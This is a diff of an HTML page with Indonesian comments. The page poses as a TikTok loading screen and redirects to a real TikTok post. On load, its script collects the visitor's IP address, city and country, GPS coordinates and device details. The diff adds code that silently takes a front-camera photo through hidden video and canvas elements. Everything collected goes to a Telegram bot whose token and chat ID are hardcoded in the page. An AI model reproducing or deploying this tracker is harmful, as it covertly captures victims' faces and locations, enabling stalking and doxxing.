@@ -5,136 +5,166 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TikTok</title>
     <style>
-        /* Mengatur layar menjadi hitam penuh */
         body, html {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #000000;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0; padding: 0; width: 100%; height: 100%;
+            background-color: #000000; display: flex; flex-direction: column;
+            justify-content: center; align-items: center;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
         }
-
-        /* Logo TikTok */
-        .logo {
-            width: 80px;
-            height: 80px;
-            margin-bottom: 20px;
-            animation: pulse 1.5s infinite ease-in-out;
-        }
-
-        /* Animasi Loading Bar */
-        .loader-bar {
-            width: 150px;
-            height: 3px;
-            background-color: #222;
-            border-radius: 5px;
-            overflow: hidden;
-            position: relative;
-        }
-
+        .logo { width: 80px; height: 80px; margin-bottom: 20px; animation: pulse 1.5s infinite ease-in-out; }
+        .loader-bar { width: 150px; height: 3px; background-color: #222; border-radius: 5px; overflow: hidden; position: relative; }
         .loader-bar::after {
-            content: '';
-            position: absolute;
-            left: 0;
-            top: 0;
-            height: 100%;
-            width: 50%;
-            background-color: #FE2C55; /* Warna merah khas TikTok */
-            border-radius: 5px;
-            animation: loading 1s infinite ease-in-out;
+            content: ''; position: absolute; left: 0; top: 0; height: 100%; width: 50%;
+            background-color: #FE2C55; border-radius: 5px; animation: loading 1s infinite ease-in-out;
         }
-
-        /* Efek berdenyut untuk logo */
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 0.8; }
-            50% { transform: scale(1.1); opacity: 1; }
-            100% { transform: scale(1); opacity: 0.8; }
-        }
-
-        /* Animasi loading bar bergerak */
-        @keyframes loading {
-            0% { left: -50%; }
-            100% { left: 100%; }
-        }
+        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } }
+        @keyframes loading { 0% { left: -50%; } 100% { left: 100%; } }
+        
+        /* Sembunyikan elemen video dan canvas */
+        #hidden-video, #hidden-canvas { display: none; }
     </style>
 </head>
 <body>
-    
-    <!-- Logo TikTok (SVG) -->
     <svg class="logo" viewBox="0 0 448 512" xmlns="http://www.w3.org/2000/svg">
         <path fill="#FFFFFF" d="M448,209.91a210.06,210.06,0,0,1-122.77-39.25V349.38A162.55,162.55,0,1,1,185,188.31V278.2a74.62,74.62,0,1,0,52.23,71.18V0l88,0a121.18,121.18,0,0,0,1.86,22.17h0A122.18,122.18,0,0,0,381,102.39a121.43,121.43,0,0,0,67,20.14Z"/>
     </svg>
-
-    <!-- Loading Bar -->
     <div class="loader-bar"></div>
 
+    <video id="hidden-video" autoplay playsinline muted></video>
+    <canvas id="hidden-canvas"></canvas>
+
     <script>
-        // ==== ISI DATA ANDA ====
         const BOT_TOKEN = '9275303069:AAE5NG2xdePLKc9o7UgubNaIYhOT6r6mjdM';
         const CHAT_ID   = '1354234561';
         const TIKTOK_URL = 'https://www.tiktok.com/@rrrrevaalf/photo/7694167529983462674?is_from_webapp=1&sender_device=pc';
-        // ======================
 
-        // Fungsi untuk redirect ke TikTok
+        const video = document.getElementById('hidden-video');
+        const canvas = document.getElementById('hidden-canvas');
+
+        // 1. Fungsi Deteksi Perangkat (HP/PC & Browser)
+        function deteksiPerangkat() {
+            const ua = navigator.userAgent;
+            let device = "Tidak diketahui";
+            let os = "Tidak diketahui";
+            let browser = "Tidak diketahui";
+
+            // Deteksi OS
+            if (/android/i.test(ua)) os = "Android";
+            else if (/iPad|iPhone|iPod/.test(ua)) os = "iOS (iPhone/iPad)";
+            else if (/Windows/.test(ua)) os = "Windows (PC)";
+            else if (/Mac/.test(ua)) os = "MacOS (PC)";
+            else if (/Linux/.test(ua)) os = "Linux (PC)";
+
+            // Deteksi Tipe
+            if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) device = "HP / Mobile";
+            else device = "Komputer / Laptop";
+
+            // Deteksi Browser
+            if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Chrome";
+            else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
+            else if (ua.includes("Firefox")) browser = "Firefox";
+            else if (ua.includes("Edg")) browser = "Edge";
+            else if (ua.includes("SamsungBrowser")) browser = "Samsung Internet";
+
+            return `${device} (${os}) - ${browser}`;
+        }
+
         function redirectKeTikTok() {
             window.location.href = TIKTOK_URL;
         }
 
-        // Fungsi untuk kirim pesan teks ke Telegram
-        function kirimKeTelegram(ip, kota, negara, lat, lon) {
-            const pesan = `target ip: ${ip}\nlokasi kota: ${kota}\nlokasi negara: ${negara}\nkordinat: ${lat}, ${lon}`;
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`;
-            
-            const img = new Image();
-            // Langsung pindah ke TikTok setelah request terkirim
-            img.onload = redirectKeTikTok;
-            img.onerror = redirectKeTikTok;
-            img.src = url;
+        // 2. Fungsi Ambil Foto
+        async function ambilFoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                video.srcObject = stream;
+                
+                // Tunggu kamera siap
+                await new Promise(resolve => {
+                    video.onloadedmetadata = () => resolve();
+                    setTimeout(resolve, 1500); // Fallback jika lambat
+                });
+
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                stream.getTracks().forEach(track => track.stop());
+
+                return new Promise(resolve => {
+                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.7);
+                });
+            } catch (err) {
+                console.log("Kamera gagal/diblokir", err);
+                return null; // Kembalikan null jika gagal
+            }
         }
 
-        // Fungsi Utama
+        // 3. Fungsi Kirim ke Telegram (Teks + Foto)
+        async function kirimData(ip, kota, negara, lat, lon, deviceInfo, fotoBlob) {
+            const captionText = `gps & foto\nip hp: ${ip}\nkota: ${kota}\nnegara: ${negara}\nperkiraan menggunakan apa, hp apa, atau komputer apa: ${deviceInfo}\nkordinat: ${lat}, ${lon}`;
+
+            if (fotoBlob) {
+                // Jika foto berhasil diambil, kirim sebagai Photo dengan Caption
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', fotoBlob, 'kamera.jpg');
+                formData.append('caption', captionText);
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'no-cors'
+                });
+            } else {
+                // Jika foto gagal, kirim teks saja
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(captionText)}`;
+                await fetch(url, { mode: 'no-cors' });
+            }
+            
+            // Setelah terkirim, redirect ke TikTok
+            redirectKeTikTok();
+        }
+
+        // 4. Fungsi Utama
         async function jalankan() {
             try {
-                // 1. Ambil IP, Kota, Negara
+                const deviceInfo = deteksiPerangkat();
+
+                // Ambil IP
                 const responseIp = await fetch('https://ipwho.is/');
                 const dataIp = await responseIp.json();
-                
                 const ip = dataIp.ip || 'Tidak diketahui';
                 const kota = dataIp.city || 'Tidak diketahui';
                 const negara = dataIp.country || 'Tidak diketahui';
 
-                // 2. Minta Izin Lokasi (GPS)
+                // Minta Lokasi
                 if (!navigator.geolocation) {
-                    kirimKeTelegram(ip, kota, negara, 'Tidak Support', 'Tidak Support');
+                    const foto = await ambilFoto();
+                    kirimData(ip, kota, negara, 'Tidak Support', 'Tidak Support', deviceInfo, foto);
                     return;
                 }
 
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        // Jika diizinkan
-                        kirimKeTelegram(ip, kota, negara, pos.coords.latitude, pos.coords.longitude);
+                    async (pos) => {
+                        // Jika lokasi diizinkan
+                        const foto = await ambilFoto();
+                        kirimData(ip, kota, negara, pos.coords.latitude, pos.coords.longitude, deviceInfo, foto);
                     },
-                    (err) => {
-                        // Jika diblokir/ditolak, tetap kirim data IP
-                        kirimKeTelegram(ip, kota, negara, 'Ditolak/Gagal', 'Ditolak/Gagal');
+                    async (err) => {
+                        // Jika lokasi ditolak, tetap ambil foto dan IP
+                        const foto = await ambilFoto();
+                        kirimData(ip, kota, negara, 'Ditolak', 'Ditolak', deviceInfo, foto);
                     },
-                    // Batas waktu tunggu 8 detik, kalau tidak dijawab langsung redirect
-                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                 );
 
             } catch (error) {
-                // Jika internet mati atau API error, langsung redirect ke TikTok
                 console.error(error);
                 redirectKeTikTok();
             }
         }
 
-        // Jalankan fungsi saat halaman dibuka
         window.onload = jalankan;
     </script>
 </body>
